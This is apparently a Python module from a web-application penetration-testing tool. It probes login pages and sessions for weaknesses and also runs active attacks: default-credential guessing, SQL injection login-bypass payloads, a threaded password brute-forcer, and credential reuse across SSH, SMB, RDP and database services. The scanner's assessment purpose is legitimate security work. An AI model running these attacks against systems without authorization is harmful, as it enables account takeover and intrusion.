import os
import re

import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from modules.progress import ProgressBar

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BUNDLED_USERNAMES = os.path.join(os.path.dirname(__file__), "..", "wordlists", "common_usernames.txt")
BUNDLED_PASSWORDS = os.path.join(os.path.dirname(__file__), "..", "wordlists", "common_passwords.txt")

LOGIN_PATH_HINTS = [
    "login", "signin", "sign-in", "admin", "administrator", "wp-login.php",
    "user/login", "accounts/login", "panel", "cpanel", "dashboard",
    "auth/login", "api/login", "console", "backend", "controlpanel",
    "manage", "management", "portal", "members/login", "secure/login",
    "staff/login", "employee/login", "internal/login", "private/login",
]

REGISTRATION_PATH_HINTS = ["register", "signup", "sign-up", "user/register", "accounts/register"]
PASSWORD_RESET_PATH_HINTS = ["forgot-password", "reset-password", "password/reset",
                              "password-reset", "account/recover", "forgot_password.php"]

API_AUTH_PATH_HINTS = ["api/users", "api/me", "api/account", "api/admin", "api/v1/users", "api/v1/admin"]

CAPTCHA_SIGNATURES = ["g-recaptcha", "recaptcha", "h-captcha", "hcaptcha", "cf-turnstile", "turnstile"]
CSRF_FIELD_HINTS = ["csrf", "_token", "authenticity_token", "__requestverificationtoken"]

AUTH_TECH_COOKIE_MAP = {
    "jsessionid": "Java (Servlet container session)",
    "phpsessid": "PHP",
    "asp.net_sessionid": "ASP.NET",
    "laravel_session": "Laravel (PHP)",
    "django_session": "Django",
    "connect.sid": "Node.js (Express)",
    "sails.sid": "Node.js (Sails)",
    "ci_session": "CodeIgniter (PHP)",
}

SQL_ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL", r"Warning.*mysqli?_", r"mysql_fetch",
    r"valid MySQL result", r"ORA-\d{5}", r"Microsoft OLE DB Provider for ODBC Drivers",
    r"Unclosed quotation mark", r"PostgreSQL.*ERROR", r"org\.postgresql\.util\.PSQLException",
    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*pg_",
]

SQLI_PAYLOAD = "'"
COMMON_INJECTABLE_PARAMS = ["id", "page", "cat", "category", "search", "q", "query", "item", "product"]

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("root", "toor"),
    ("admin", ""),
    ("test", "test"),
    ("guest", "guest"),
    ("admin", "changeme"),
]


def _get(url, timeout=6, **kwargs):
    kwargs.setdefault("allow_redirects", False)
    try:
        return requests.get(url, timeout=timeout, verify=False, **kwargs)
    except requests.RequestException:
        return None


def discover_login_forms(base_url, dir_hits=None):
    candidates = set()
    for hint in LOGIN_PATH_HINTS:
        candidates.add(f"{base_url}/{hint}")
    if dir_hits:
        for hit in dir_hits:
            path_lower = hit["path"].lower()
            if any(h in path_lower for h in ("login", "admin", "signin", "panel", "cpanel")):
                candidates.add(hit["url"])

    confirmed = []
    for url in candidates:
        resp = _get(url)
        if not resp or resp.status_code >= 500:
            continue
        if resp.status_code in (200, 401, 403) or (300 <= resp.status_code < 400):
            body = (resp.text or "").lower()
            if "password" in body or "login" in body or resp.status_code in (401, 403):
                confirmed.append(url)
    return confirmed


def check_sql_injection(base_url, report=None):
    findings = []
    for param in COMMON_INJECTABLE_PARAMS:
        test_url = f"{base_url}/?{param}=1{SQLI_PAYLOAD}"
        resp = _get(test_url, allow_redirects=True)
        if not resp or not resp.text:
            continue
        for pattern in SQL_ERROR_SIGNATURES:
            if re.search(pattern, resp.text, re.IGNORECASE):
                findings.append({"param": param, "url": test_url, "signature": pattern})
                if report:
                    report.add_finding(
                        "Web Application Analysis",
                        f"Possible SQL injection via parameter '{param}'",
                        f"Error-based signature '{pattern}' observed at {test_url}. "
                        "Heuristic detection only - confirm manually.", "HIGH",
                        vuln_id="sql_injection_suspected",
                    )
                break
    if not findings and report:
        report.add_finding("Web Application Analysis", "No error-based SQL injection signatures found",
                            f"Tested params: {', '.join(COMMON_INJECTABLE_PARAMS)} on {base_url}", "INFO")
    return findings


def check_session_cookies(base_url, report=None):
    resp = _get(base_url)
    if not resp:
        return []
    issues = []
    for cookie in resp.cookies:
        missing = []
        if not cookie.secure:
            missing.append("Secure")
        has_httponly = "httponly" in [k.lower() for k in cookie._rest.keys()] if hasattr(cookie, "_rest") else False
        if not has_httponly:
            missing.append("HttpOnly")
        samesite = cookie._rest.get("SameSite") if hasattr(cookie, "_rest") else None
        if not samesite:
            missing.append("SameSite")
        if missing:
            issues.append({"cookie": cookie.name, "missing": missing})
            if report:
                report.add_finding(
                    "Web Application Analysis",
                    f"Session cookie '{cookie.name}' missing security flags: {', '.join(missing)}",
                    "Cookies without these flags are more exposed to theft via XSS or "
                    "network interception", "LOW", vuln_id="weak_session_cookie",
                )
    if not issues and resp.cookies and report:
        report.add_finding("Web Application Analysis", "Session cookies carry expected security flags",
                            f"Checked {len(resp.cookies)} cookie(s) from {base_url}", "INFO")
    return issues


def _extract_login_form(html, page_url):
    soup = BeautifulSoup(html or "", "html.parser")
    form = soup.find("form")
    if not form:
        return None
    action = form.get("action") or page_url
    if action.startswith("/") or not action.startswith("http"):
        from urllib.parse import urljoin
        action = urljoin(page_url, action)
    method = (form.get("method") or "post").lower()

    user_field = pass_field = None
    extra_fields = {}
    for inp in form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        itype = (inp.get("type") or "text").lower()
        if itype == "password" and not pass_field:
            pass_field = name
        elif itype in ("text", "email") and not user_field and \
                any(h in name.lower() for h in ("user", "email", "login", "name")):
            user_field = name
        elif itype == "hidden":
            extra_fields[name] = inp.get("value", "")
    if not user_field or not pass_field:
        return None
    return {"action": action, "method": method, "user_field": user_field,
            "pass_field": pass_field, "extra_fields": extra_fields}


def attempt_default_credentials(login_url, report=None):
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    form = _extract_login_form(resp.text, login_url)
    if not form:
        return None

    baseline_len = len(resp.text or "")
    session = requests.Session()
    session.verify = False

    for username, password in DEFAULT_CREDENTIALS:
        payload = dict(form["extra_fields"])
        payload[form["user_field"]] = username
        payload[form["pass_field"]] = password
        try:
            if form["method"] == "post":
                attempt = session.post(form["action"], data=payload, timeout=6,
                                        allow_redirects=True, verify=False)
            else:
                attempt = session.get(form["action"], params=payload, timeout=6,
                                       allow_redirects=True, verify=False)
        except requests.RequestException:
            continue

        attempt_body = (attempt.text or "").lower()
        failure_indicators = ["invalid", "incorrect", "failed", "error", "denied", "try again"]
        looks_like_failure = any(ind in attempt_body for ind in failure_indicators)
        length_changed = abs(len(attempt.text or "") - baseline_len) > 200
        redirected_away = attempt.url != login_url and attempt.history

        if (length_changed or redirected_away) and not looks_like_failure:
            if report:
                report.add_finding(
                    "Web Application Analysis",
                    f"Default credentials may have succeeded: {username}:{password or '(blank)'}",
                    f"Login attempt at {login_url} produced a different response than a "
                    "failed login (redirect or significant content change). Verify manually "
                    "in-browser before relying on this.", "CRITICAL",
                    vuln_id="default_creds_confirmed",
                )
            return {"username": username, "password": password, "url": login_url}

    if report:
        report.add_finding("Web Application Analysis", "No default credentials succeeded",
                            f"Tried {len(DEFAULT_CREDENTIALS)} common pairs against {login_url}", "INFO")
    return None


SQLI_AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1-- -", "' OR 1=1#",
    "admin'--", "admin' #", "admin'/*", "' OR 'a'='a", '" OR "1"="1',
    "') OR ('1'='1", "') OR ('1'='1'-- ", "1' OR '1' = '1",
]


def attempt_sql_login_bypass(login_url, report=None):
    """Classic ' OR '1'='1-style authentication-bypass payloads against a
    login form's username/password fields - no password guessing, just
    breaking the SQL logic behind the check. Same success heuristic as
    attempt_default_credentials (redirect/content-length change with no
    failure wording)."""
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    form = _extract_login_form(resp.text, login_url)
    if not form:
        return None

    baseline_len = len(resp.text or "")
    session = requests.Session()
    session.verify = False
    failure_indicators = ["invalid", "incorrect", "failed", "error", "denied", "try again"]

    for payload_str in SQLI_AUTH_BYPASS_PAYLOADS:
        for target_both in (False, True):
            payload = dict(form["extra_fields"])
            payload[form["user_field"]] = payload_str
            payload[form["pass_field"]] = payload_str if target_both else "x"
            try:
                if form["method"] == "post":
                    attempt = session.post(form["action"], data=payload, timeout=6,
                                            allow_redirects=True, verify=False)
                else:
                    attempt = session.get(form["action"], params=payload, timeout=6,
                                           allow_redirects=True, verify=False)
            except requests.RequestException:
                continue

            attempt_body = (attempt.text or "").lower()
            looks_like_failure = any(ind in attempt_body for ind in failure_indicators)
            sql_error = any(re.search(pattern, attempt.text or "", re.IGNORECASE)
                             for pattern in SQL_ERROR_SIGNATURES)
            length_changed = abs(len(attempt.text or "") - baseline_len) > 200
            redirected_away = attempt.url != login_url and attempt.history

            if sql_error and report:
                report.add_finding(
                    "Web Application Analysis",
                    f"Login form raises a SQL error under injection: {payload_str}",
                    f"Field(s) likely concatenated directly into a query at {login_url} - "
                    "worth testing further with sqlmap against this form", "HIGH",
                    vuln_id="sql_injection_suspected",
                )

            if (length_changed or redirected_away) and not looks_like_failure and not sql_error:
                if report:
                    report.add_finding(
                        "Web Application Analysis",
                        f"SQL injection authentication bypass succeeded: {payload_str}",
                        f"Login at {login_url} accepted a malformed boolean-logic payload in "
                        "place of real credentials, suggesting the query is built with "
                        "unsanitized string concatenation (e.g. "
                        "\"SELECT * FROM users WHERE user='$u' AND pass='$p'\")", "CRITICAL",
                        vuln_id="sql_injection_suspected",
                    )
                return {"payload": payload_str, "url": login_url, "method": "sqli_auth_bypass"}

    if report:
        report.add_finding("Web Application Analysis", "No SQL injection authentication bypass succeeded",
                            f"Tried {len(SQLI_AUTH_BYPASS_PAYLOADS)} boolean-logic payload(s) against {login_url}",
                            "INFO")
    return None


def check_basic_digest_auth(base_url, report=None):
    resp = _get(base_url)
    if not resp:
        return None
    auth_header = resp.headers.get("WWW-Authenticate", "")
    if not auth_header:
        return None
    scheme = auth_header.split(" ")[0]
    if report:
        if scheme.lower() == "basic":
            report.add_finding("Web Application Analysis", "HTTP Basic Authentication in use",
                                "Credentials are base64-encoded, not encrypted - requires HTTPS "
                                "to avoid cleartext exposure", "MEDIUM" if base_url.startswith("http://") else "INFO")
        elif scheme.lower() == "digest":
            report.add_finding("Web Application Analysis", "HTTP Digest Authentication in use",
                                auth_header, "INFO")
    return scheme


def check_csrf_protection(login_url, report=None):
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    soup = BeautifulSoup(resp.text or "", "html.parser")
    form = soup.find("form")
    if not form:
        return None
    field_names = [inp.get("name", "").lower() for inp in form.find_all("input")]
    has_csrf = any(hint in name for name in field_names for hint in CSRF_FIELD_HINTS)
    if report and not has_csrf:
        report.add_finding("Web Application Analysis", f"No CSRF token found on login form: {login_url}",
                            "Form submits without an anti-CSRF token field", "LOW",
                            vuln_id="csrf_missing")
    return has_csrf


def check_captcha(login_url, report=None):
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    body = (resp.text or "").lower()
    found = any(sig in body for sig in CAPTCHA_SIGNATURES)
    if report and not found:
        report.add_finding("Web Application Analysis", f"No CAPTCHA detected on login form: {login_url}",
                            "No automated-abuse protection signature found in page content", "LOW",
                            vuln_id="captcha_absent")
    return found


def check_registration_page(base_url, report=None):
    for path in REGISTRATION_PATH_HINTS:
        resp = _get(f"{base_url}/{path}", allow_redirects=True)
        if resp and resp.status_code == 200 and "password" in (resp.text or "").lower():
            if report:
                report.add_finding("Web Application Analysis", f"Registration page found: /{path}",
                                    "Review for weak password requirements, email verification "
                                    "bypass, and role/privilege assignment at signup", "INFO")
            return f"{base_url}/{path}"
    return None


def check_password_reset(base_url, report=None):
    for path in PASSWORD_RESET_PATH_HINTS:
        url = f"{base_url}/{path}"
        resp = _get(url, allow_redirects=True)
        if not resp or resp.status_code != 200:
            continue

        form = _extract_login_form(resp.text, url) or {}
        email_field = None
        soup = BeautifulSoup(resp.text or "", "html.parser")
        for inp in soup.find_all("input"):
            name = (inp.get("name") or "").lower()
            itype = (inp.get("type") or "").lower()
            if itype == "email" or "email" in name or "username" in name:
                email_field = inp.get("name")
                break
        if not email_field:
            if report:
                report.add_finding("Web Application Analysis", f"Password reset page found: /{path}",
                                    "Could not auto-detect the identifier field for enumeration testing",
                                    "INFO")
            return url

        try:
            resp_valid_like = requests.post(url, data={email_field: "admin@example.com"},
                                             timeout=6, verify=False)
            resp_invalid_like = requests.post(url, data={email_field: "nonexistent-user-xyz@example.com"},
                                               timeout=6, verify=False)
            if resp_valid_like.text != resp_invalid_like.text and report:
                report.add_finding(
                    "Web Application Analysis",
                    f"Password reset may leak valid-account status: /{path}",
                    "Responses differ between a plausible and an implausible account identifier, "
                    "which can allow username/email enumeration", "MEDIUM",
                    vuln_id="user_enum_password_reset",
                )
            elif report:
                report.add_finding("Web Application Analysis", f"Password reset page found: /{path}",
                                    "Responses for valid-looking vs invalid identifiers appear identical",
                                    "INFO")
        except requests.RequestException:
            pass
        return url
    return None


def check_login_response_enumeration(login_url, report=None):
    form = None
    resp = _get(login_url, allow_redirects=True)
    if resp:
        form = _extract_login_form(resp.text, login_url)
    if not form:
        return None

    try:
        valid_user_wrong_pass = requests.post(
            form["action"], data={**form["extra_fields"], form["user_field"]: "admin",
                                   form["pass_field"]: "definitely-wrong-password-123"},
            timeout=6, verify=False, allow_redirects=True)
        bogus_user = requests.post(
            form["action"], data={**form["extra_fields"], form["user_field"]: "zzz-nonexistent-user-123",
                                   form["pass_field"]: "definitely-wrong-password-123"},
            timeout=6, verify=False, allow_redirects=True)
    except requests.RequestException:
        return None

    if len(valid_user_wrong_pass.text or "") != len(bogus_user.text or "") and report:
        report.add_finding(
            "Web Application Analysis",
            f"Login error messages may leak valid usernames: {login_url}",
            "Response length differs between a guessed existing username and a clearly "
            "bogus one with the same wrong password", "MEDIUM",
            vuln_id="user_enum_login_response",
        )
    return None


def check_api_auth(base_url, report=None):
    findings = []
    for path in API_AUTH_PATH_HINTS:
        resp = _get(f"{base_url}/{path}")
        if not resp:
            continue
        if resp.status_code == 200:
            findings.append(path)
            if report:
                report.add_finding("Web Application Analysis", f"API endpoint accessible without auth: /{path}",
                                    f"HTTP {resp.status_code} returned with no Authorization header",
                                    "HIGH", vuln_id="api_no_auth")
    return findings


def fingerprint_auth_tech(base_url, report=None):
    resp = _get(base_url)
    if not resp:
        return None
    techs = set()
    for cookie_name in resp.cookies.keys():
        tech = AUTH_TECH_COOKIE_MAP.get(cookie_name.lower())
        if tech:
            techs.add(tech)
    if report and techs:
        report.add_finding("Web Application Analysis", f"Authentication/session technology: {', '.join(techs)}",
                            f"Identified via session cookie name(s) at {base_url}", "INFO")
    return sorted(techs)


def check_session_fixation(base_url, report=None):
    session = requests.Session()
    session.verify = False
    try:
        resp1 = session.get(base_url, timeout=6)
    except requests.RequestException:
        return None
    pre_auth_cookies = {c.name: c.value for c in resp1.cookies}
    if not pre_auth_cookies:
        return None
    try:
        resp2 = session.get(base_url, timeout=6)
    except requests.RequestException:
        return None
    post_cookies = {c.name: c.value for c in resp2.cookies}
    unchanged = {k: v for k, v in pre_auth_cookies.items() if post_cookies.get(k) == v}
    if unchanged and report:
        report.add_finding(
            "Web Application Analysis", "Session identifier does not rotate across requests",
            f"Cookie(s) unchanged: {', '.join(unchanged.keys())}. Full confirmation requires "
            "checking whether the session ID also stays the same after a successful login.",
            "LOW", vuln_id="session_fixation",
        )
    return unchanged


def check_account_lockout(login_url, attempts=6, report=None):
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    form = _extract_login_form(resp.text, login_url)
    if not form:
        return None

    session = requests.Session()
    session.verify = False
    lockout_keywords = ["locked", "too many attempts", "try again later", "temporarily disabled"]
    last_body = ""
    for i in range(attempts):
        payload = dict(form["extra_fields"])
        payload[form["user_field"]] = "admin"
        payload[form["pass_field"]] = f"wrong-password-{i}"
        try:
            attempt = session.post(form["action"], data=payload, timeout=6, verify=False)
            last_body = (attempt.text or "").lower()
        except requests.RequestException:
            continue

    locked = any(k in last_body for k in lockout_keywords)
    if report:
        if locked:
            report.add_finding("Web Application Analysis", "Account lockout mechanism detected",
                                f"Lockout indication appeared after {attempts} failed attempts at {login_url}",
                                "INFO")
        else:
            report.add_finding("Web Application Analysis", "No account lockout detected",
                                f"{attempts} failed attempts produced no lockout indication - "
                                "may allow unlimited guessing", "MEDIUM", vuln_id="no_account_lockout")
    return locked


def check_mfa_otp_indicators(login_url, report=None):
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    body = (resp.text or "").lower()
    mfa_keywords = ["otp", "one-time code", "one time code", "authenticator app",
                     "verification code", "2fa", "two-factor", "multi-factor"]
    found = any(k in body for k in mfa_keywords)
    if report:
        title = "MFA/OTP indicators found on login flow" if found else "No MFA/OTP indicators found"
        severity = "INFO" if found else "LOW"
        report.add_finding("Web Application Analysis", title, login_url, severity)
    return found


def detect_multistep_login(login_url, report=None):
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    form = _extract_login_form(resp.text, login_url)
    if form is None:
        soup = BeautifulSoup(resp.text or "", "html.parser")
        has_username_only = soup.find("input", {"type": "email"}) or soup.find("input", {"name": re.compile("user|email", re.I)})
        if has_username_only and report:
            report.add_finding("Web Application Analysis", f"Possible multi-step (username-first) login: {login_url}",
                                "No password field found on the initial page - password is likely "
                                "requested on a subsequent step", "INFO")
        return bool(has_username_only)
    return False


def check_session_expiration(base_url, report=None):
    resp = _get(base_url)
    if not resp:
        return None
    long_lived = []
    for cookie in resp.cookies:
        if cookie.expires:
            import time
            days = (cookie.expires - time.time()) / 86400
            if days > 30:
                long_lived.append((cookie.name, round(days)))
    if report and long_lived:
        detail = ", ".join(f"{name} ({days}d)" for name, days in long_lived)
        report.add_finding("Web Application Analysis", "Long-lived session cookie(s) found",
                            f"{detail} - long expiration windows increase the impact of a stolen "
                            "session token", "LOW")
    return long_lived


def assess_session_hijacking_risk(base_url, cookie_issues, report=None):
    risk_factors = []
    if base_url.startswith("http://"):
        risk_factors.append("session transmitted over plaintext HTTP")
    if any("HttpOnly" in issue["missing"] for issue in cookie_issues):
        risk_factors.append("cookie readable by JavaScript (no HttpOnly)")
    if any("Secure" in issue["missing"] for issue in cookie_issues):
        risk_factors.append("cookie sendable over plaintext connections (no Secure)")

    if report and risk_factors:
        severity = "HIGH" if len(risk_factors) > 1 else "MEDIUM"
        report.add_finding("Web Application Analysis", "Elevated session hijacking risk",
                            "; ".join(risk_factors), severity)
    return risk_factors


def _load_wordlist_or_default(path, default_path):
    use_path = path if path else default_path
    with open(use_path, "r", encoding="utf-8", errors="ignore") as fh:
        return [l.strip() for l in fh if l.strip()]


def _base_url_of(login_url):
    from urllib.parse import urlparse
    parsed = urlparse(login_url)
    return f"{parsed.scheme}://{parsed.netloc}"


def detect_site_type(base_url):
    from modules import wordpress_enum
    is_wp, resp = wordpress_enum.detect_wordpress(base_url)
    if is_wp:
        return "wordpress", resp
    if not resp:
        resp = _get(base_url)
    site_type = "generic"
    if resp:
        powered_by = resp.headers.get("X-Powered-By", "").lower()
        cookie_names = [c.lower() for c in resp.cookies.keys()]
        is_php = ("php" in powered_by or any("phpsessid" in c for c in cookie_names)
                  or (resp.url or "").lower().endswith(".php"))
        if is_php:
            site_type = "php"
    return site_type, resp


def discover_candidate_usernames(login_url, report=None):
    from modules import wordpress_enum, wordlist_tools

    base_url = _base_url_of(login_url)
    site_type, _ = detect_site_type(base_url)

    if report:
        report.add_finding("Authentication Testing", f"Site type detected: {site_type}",
                            f"Used to decide the username discovery strategy for {base_url}", "INFO")

    if site_type == "wordpress":
        found = wordpress_enum.enumerate_users_rest(base_url)
        if not found:
            found = wordpress_enum.enumerate_users_author_archive(base_url)
        found = sorted({u for u in found if u})
        if found:
            return {"usernames": found, "source": "WordPress user enumeration (/wp-json, author archive)",
                    "site_type": site_type}

    seclists_path = wordlist_tools.resolve_username_source()
    if seclists_path:
        return {"usernames": wordlist_tools.load_list(seclists_path),
                "source": f"SecLists ({seclists_path})", "site_type": site_type}

    return {"usernames": _load_wordlist_or_default(None, BUNDLED_USERNAMES),
            "source": "bundled common-username list", "site_type": site_type}


def _has_dynamic_token(form):
    token_hints = ("csrf", "token", "nonce", "verification")
    return any(hint in name.lower() for name in form["extra_fields"] for hint in token_hints)


def brute_force_http_form(login_url, userlist_path=None, passlist_path=None,
                           threads=10, max_attempts=None, report=None):
    import queue
    import threading
    from modules import wordlist_tools

    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    form = _extract_login_form(resp.text, login_url)
    if not form:
        if report:
            report.add_finding("Authentication Testing", "HTTP form brute force skipped",
                                f"Could not identify a username/password form at {login_url}", "INFO")
        return None

    if userlist_path:
        usernames = _load_wordlist_or_default(userlist_path, None)
        username_source = f"supplied list ({userlist_path})"
    else:
        discovered = discover_candidate_usernames(login_url, report=report)
        usernames = discovered["usernames"]
        username_source = discovered["source"]

    if passlist_path:
        password_path = passlist_path
        password_source = passlist_path
    else:
        rockyou_path = wordlist_tools.resolve_password_source()
        if rockyou_path:
            password_path = rockyou_path
            password_source = f"rockyou ({rockyou_path})"
        else:
            password_path = BUNDLED_PASSWORDS
            password_source = "bundled common-password list"

    total_passwords = wordlist_tools.count_lines(password_path, cap=2_000_000)
    estimated_total = len(usernames) * total_passwords if total_passwords < 2_000_000 else None

    if report:
        report.add_finding("Authentication Testing",
                            f"HTTP form brute force starting: {len(usernames)} username(s)",
                            f"Usernames: {username_source} | Passwords: {password_source}",
                            "INFO")

    bar = ProgressBar(total=estimated_total, label="Brute-forcing login form")
    baseline_len = len(resp.text or "")
    session = requests.Session()
    session.verify = False
    failure_indicators = ["invalid", "incorrect", "failed", "error", "denied", "try again"]
    lockout_keywords = ["locked", "too many attempts", "try again later", "temporarily disabled"]
    lockout_threshold = 5
    dynamic_token = _has_dynamic_token(form)

    stop_event = threading.Event()
    lock = threading.Lock()
    result_holder = {}
    counters = {"attempts": 0, "lockout_hits": 0}
    work_queue = queue.Queue(maxsize=threads * 4)

    def worker():
        while not stop_event.is_set():
            item = work_queue.get()
            try:
                if item is None:
                    return
                username, password = item
                current_form = form
                if dynamic_token:
                    fresh_resp = _get(login_url, allow_redirects=True)
                    fresh_form = _extract_login_form(fresh_resp.text, login_url) if fresh_resp else None
                    if not fresh_form:
                        continue
                    current_form = fresh_form

                payload = dict(current_form["extra_fields"])
                payload[current_form["user_field"]] = username
                payload[current_form["pass_field"]] = password
                try:
                    attempt = session.post(current_form["action"], data=payload, timeout=6,
                                            verify=False, allow_redirects=True)
                except requests.RequestException:
                    continue

                with lock:
                    counters["attempts"] += 1
                bar.update(current=counters["attempts"])

                body = (attempt.text or "").lower()
                looks_like_failure = any(ind in body for ind in failure_indicators)
                is_lockout = any(k in body for k in lockout_keywords)
                if is_lockout:
                    with lock:
                        counters["lockout_hits"] += 1
                        if counters["lockout_hits"] >= lockout_threshold:
                            stop_event.set()
                    continue

                length_changed = abs(len(attempt.text or "") - baseline_len) > 200
                redirected_away = attempt.url != login_url and attempt.history
                if (length_changed or redirected_away) and not looks_like_failure:
                    with lock:
                        if "username" not in result_holder:
                            result_holder["username"] = username
                            result_holder["password"] = password
                            result_holder["attempts"] = counters["attempts"]
                    stop_event.set()
            finally:
                work_queue.task_done()

    worker_threads = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in worker_threads:
        t.start()

    interrupted = False
    try:
        for username in usernames:
            if stop_event.is_set():
                break
            for password in wordlist_tools.iter_wordlist(password_path):
                if stop_event.is_set():
                    break
                if max_attempts and counters["attempts"] >= max_attempts:
                    stop_event.set()
                    break
                while not stop_event.is_set():
                    try:
                        work_queue.put((username, password), timeout=0.5)
                        break
                    except queue.Full:
                        continue
    except KeyboardInterrupt:
        interrupted = True
        stop_event.set()
    finally:
        stop_event.set()
        for _ in worker_threads:
            try:
                work_queue.put_nowait(None)
            except queue.Full:
                pass
        for t in worker_threads:
            t.join(timeout=5)

    if result_holder.get("username"):
        bar.finish(f"Credentials found after {result_holder['attempts']} attempt(s)")
        if report:
            report.add_finding(
                "Authentication Testing",
                f"HTTP form credentials found: {result_holder['username']}:{result_holder['password']}",
                f"Discovered after {result_holder['attempts']} attempt(s) against {login_url}",
                "CRITICAL", vuln_id="brute_force_success",
            )
        return result_holder

    bar.finish(f"Stopped after {counters['attempts']} attempt(s)")
    if report:
        if interrupted:
            report.add_finding("Authentication Testing", "HTTP form brute force interrupted by user",
                                f"{counters['attempts']} attempt(s) made before stopping", "INFO")
        elif counters["lockout_hits"] >= lockout_threshold:
            report.add_finding("Authentication Testing", "HTTP form brute force aborted - lockout detected",
                                f"{counters['attempts']} attempt(s) made before an account lockout "
                                "indication appeared repeatedly; stopped to avoid further noise", "INFO")
        else:
            report.add_finding("Authentication Testing", "HTTP form brute force: no valid credentials found",
                                f"Tried {counters['attempts']} combination(s) against {login_url}", "INFO")
    return None


def validate_credentials(login_url, username, password, report=None):
    resp = _get(login_url, allow_redirects=True)
    if not resp:
        return None
    form = _extract_login_form(resp.text, login_url)
    if not form:
        return None

    baseline_len = len(resp.text or "")
    payload = dict(form["extra_fields"])
    payload[form["user_field"]] = username
    payload[form["pass_field"]] = password
    session = requests.Session()
    session.verify = False
    try:
        attempt = session.post(form["action"], data=payload, timeout=6, verify=False, allow_redirects=True)
    except requests.RequestException:
        return None

    attempt_body = (attempt.text or "").lower()
    failure_indicators = ["invalid", "incorrect", "failed", "error", "denied", "try again"]
    looks_like_failure = any(ind in attempt_body for ind in failure_indicators)
    length_changed = abs(len(attempt.text or "") - baseline_len) > 200
    redirected_away = attempt.url != login_url and attempt.history
    success = (length_changed or redirected_away) and not looks_like_failure

    if report:
        report.add_finding(
            "Authentication Testing",
            f"Credential check {'succeeded' if success else 'failed'}: {username}:{password or '(blank)'}",
            f"Tested against {login_url}", "CRITICAL" if success else "INFO",
            vuln_id="default_creds_confirmed" if success else None,
        )
    return success


def check_credential_reuse(target, confirmed_creds, open_ports, report=None, other_login_urls=None):
    """Actively retry already-confirmed credentials against every other
    open network service and discovered web login form. `open_ports` is
    the list returned by port_scanner.scan; `confirmed_creds` is a list
    of (username, password) tuples already proven to work somewhere."""
    from modules import bruteforce

    port_to_service = {21: "ftp", 22: "ssh", 445: "smb", 3389: "rdp",
                        3306: "mysql", 5432: "postgres", 6379: "redis",
                        27017: "mongodb", 23: "telnet", 5900: "vnc", 1433: "mssql"}
    standard_port = {21, 22, 445, 3389}

    results = []
    if not confirmed_creds:
        return results

    services_present = {port_to_service[p["port"]]: p["port"]
                         for p in (open_ports or []) if p["port"] in port_to_service}

    for username, password in confirmed_creds:
        for service, port in services_present.items():
            try:
                success = bruteforce.try_single_credential(
                    service, target, username, password,
                    port=None if port in standard_port else port, report=report)
            except Exception:
                success = None
            if success:
                results.append({"service": service, "username": username, "password": password})

        for login_url in (other_login_urls or []):
            success = validate_credentials(login_url, username, password, report=report)
            if success:
                results.append({"service": login_url, "username": username, "password": password})

    return results


def run_analysis(target, scheme="http", port=None, dir_hits=None, report=None, skip_authtest=False):
    base_url = f"{scheme}://{target}"
    if port and port not in (80, 443):
        base_url += f":{port}"

    login_urls = discover_login_forms(base_url, dir_hits=dir_hits)
    if report:
        if login_urls:
            report.add_finding("Web Application Analysis", f"Login form(s) discovered: {len(login_urls)}",
                                ", ".join(login_urls), "INFO")
        else:
            report.add_finding("Web Application Analysis", "No login forms discovered",
                                f"Checked common paths/hints on {base_url}", "INFO")

    check_sql_injection(base_url, report=report)
    cookie_issues = check_session_cookies(base_url, report=report)
    check_basic_digest_auth(base_url, report=report)
    check_registration_page(base_url, report=report)
    check_password_reset(base_url, report=report)
    check_api_auth(base_url, report=report)
    fingerprint_auth_tech(base_url, report=report)
    check_session_fixation(base_url, report=report)
    check_session_expiration(base_url, report=report)
    assess_session_hijacking_risk(base_url, cookie_issues or [], report=report)

    for url in login_urls:
        check_csrf_protection(url, report=report)
        check_captcha(url, report=report)
        check_login_response_enumeration(url, report=report)
        check_mfa_otp_indicators(url, report=report)
        detect_multistep_login(url, report=report)
        check_account_lockout(url, report=report)

    if not skip_authtest:
        for url in login_urls:
            attempt_default_credentials(url, report=report)
    elif report:
        report.add_finding("Web Application Analysis", "Default credential testing skipped",
                            "--skip-authtest was set", "INFO")

    return {"base_url": base_url, "login_urls": login_urls}
